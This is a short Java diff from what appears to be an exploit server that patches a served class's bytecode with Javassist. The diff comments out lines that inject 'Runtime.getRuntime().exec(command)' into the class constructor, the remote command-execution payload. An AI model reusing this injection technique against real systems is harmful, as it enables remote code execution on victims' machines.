@@ -9,6 +9,7 @@ import org.apache.commons.lang3.reflect.FieldUtils;
 
 import java.io.ByteArrayOutputStream;
 import java.net.InetSocketAddress;
+import java.util.Arrays;
 import java.util.concurrent.Executors;
 import java.util.jar.JarOutputStream;
 import java.util.zip.ZipEntry;
@@ -43,8 +44,8 @@ public class HttpServer implements HttpHandler {
 		CtClass exploitClass = classPool.get(clazz.getName());
 
 		//patch its bytecode by adding a new command
-		CtConstructor m = exploitClass.getConstructors()[0];
-		m.insertBefore("{ Runtime.getRuntime().exec(\"" +  escapeJava(command) + "\"); }");
+//		CtConstructor m = exploitClass.getConstructors()[0];
+//		m.insertBefore("{ Runtime.getRuntime().exec(\"" +  escapeJava(command) + "\"); }");
 		exploitClass.setName(newName);
 		exploitClass.detach();
 		return exploitClass.toBytecode();
